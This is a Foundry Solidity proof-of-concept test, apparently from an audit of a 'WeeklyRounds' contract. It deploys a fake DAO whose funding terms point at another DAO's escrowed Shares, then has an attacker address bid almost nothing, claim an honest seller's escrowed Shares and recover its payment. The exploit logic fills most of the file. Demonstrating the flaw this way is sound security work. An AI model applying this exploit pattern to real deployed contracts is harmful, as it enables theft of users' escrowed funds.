// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {WeeklyRounds} from "../src/WeeklyRounds.sol";
import {Tok, HonestDao} from "./Poc.t.sol";

/// A fake DAO whose "funding terms" hand a funding round someone else's escrowed Shares.
contract FakeFundingDao {
    Tok public shares;
    Tok public loot;
    address public payouts;
    address public target;
    uint256 public units;
    constructor(address target_, uint256 units_) { shares = new Tok("FS"); loot = new Tok("FL"); target = target_; units = units_; shares.mint(address(1), 1e18); }
    function setEx(address e) external { shares.setEx(e); }
    function votingWeight() external view returns (address) { return address(this); }
    function mandateFactory() external view returns (address) { return address(this); }
    function fundingTerms() external view returns (address) { return address(this); }
    function reserve(address) external view returns (uint256, uint256, address) { return (units, 1, target); }
    function settle(address, uint256) external {}
    function sweep(IERC20 t, address to) external { t.transfer(to, t.balanceOf(address(this))); }
}

contract Poc2Test is Test {
    function test_fake_funding_round_takes_escrowed_shares() public {
        Tok usd = new Tok("USD");
        WeeklyRounds rounds = new WeeklyRounds(IERC20(address(usd)), 1e4);
        HonestDao h = new HonestDao();
        h.setEx(address(rounds));
        h.mintTo(address(0xA), 1000e18);
        usd.mint(address(h), 1000e6);
        uint256 id = rounds.open(address(h));
        vm.startPrank(address(0xA));
        h.shares().approve(address(rounds), type(uint256).max);
        rounds.sell(id, 1000e18, 50);
        vm.stopPrank();

        address mallory = address(0xBAD);
        usd.mint(mallory, 100e6);
        vm.startPrank(mallory);
        FakeFundingDao f = new FakeFundingDao(address(h.shares()), 1000e18);
        f.setEx(address(rounds));
        uint256 fid = rounds.openFunding(address(f));
        usd.approve(address(rounds), type(uint256).max);
        (,,,,, uint128 step,,,,,,,,,,,,) = rounds.rounds(fid);
        // floor of the fake DAO is 0; bid at a few cents per Share
        rounds.bid(fid, 1000e18, 2);
        vm.warp(block.timestamp + 3 days);
        (uint256 s,,) = rounds.clearingStep(fid);
        rounds.settle(fid, s);
        rounds.claim(fid, mallory);
        f.sweep(IERC20(address(usd)), mallory); // the "treasury" payment comes back to the attacker
        vm.stopPrank();
        assertEq(h.shares().balanceOf(mallory), 1000e18, "honest seller's escrowed Shares taken");
        emit log_named_uint("attacker net USDC cost", 100e6 - usd.balanceOf(mallory));
        emit log_named_uint("step", step);
        // The honest seller's claim now fails.
        vm.warp(block.timestamp + 3 days);
        vm.expectRevert();
        rounds.claim(id, address(0xA));
    }
}
